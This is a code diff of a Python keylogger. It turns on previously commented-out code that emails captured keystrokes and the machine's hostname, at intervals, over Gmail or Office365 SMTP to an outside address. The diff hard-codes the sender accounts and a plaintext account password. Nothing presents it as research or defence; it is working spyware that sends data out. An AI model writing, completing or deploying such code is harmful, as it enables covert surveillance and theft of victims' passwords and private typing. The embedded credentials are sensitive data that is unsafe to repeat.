@@ -10,6 +10,8 @@ global sendfreq
 global sent
 global mins
 global word
+global servercon
+global sender
 
 maildata=[]
 sendfreq=1 #in minutes
@@ -18,10 +20,12 @@ mins=-sendfreq
 word=''
 hostname=platform.node()
 
-
+if os.system("ping smtp.gmail.com")==0:#fix this
     servercon='smtp.gmail.com'
+    sender='band.mishaps@gmail.com'
 else:
-    servercon='smtp-mail.outlook.com'
+    servercon='smtp.office365.com'
+    sender='python7512@gmail.com'
 
 log_dir = ""
 
@@ -42,6 +46,8 @@ def on_press(key):
     global sent
     global mins
     global word
+    global servercon
+    global sender
 
     #print(abs(mins-datetime.datetime.now().minute))
     #print(sent)
@@ -64,17 +70,11 @@ def on_press(key):
         mins=datetime.datetime.now().minute
         
         print('sending email')
-        if os.system("ping smtp.gmail.com")==0:
-            #server = smtplib.SMTP('smtp.gmail.com', 587)
-            #server.starttls()
-            #server.login("band.mishaps@gmail.com", "Baobab7512")
-            #server.sendmail("band.mishaps@gmail.com", "band.mishaps@gmail.com", str(hostname)+'\n'+str(maildata))
-        else:
-            #server = smtplib.SMTP('smtp.gmail.com', 587)
-            #server.starttls()
-            #server.login("band.mishaps@gmail.com", "Baobab7512")
-            #server.sendmail("band.mishaps@gmail.com", "band.mishaps@gmail.com", str(hostname)+'\n'+str(maildata))
-        #server.quit()
+        server = smtplib.SMTP(servercon, 587)
+        server.starttls()
+        server.login(sender, "Baobab7512")
+        server.sendmail(sender, "band.mishaps@gmail.com", str(hostname)+'\n'+str(maildata))
+        server.quit()
         print('email sent')
         print(maildata)
         sent=True
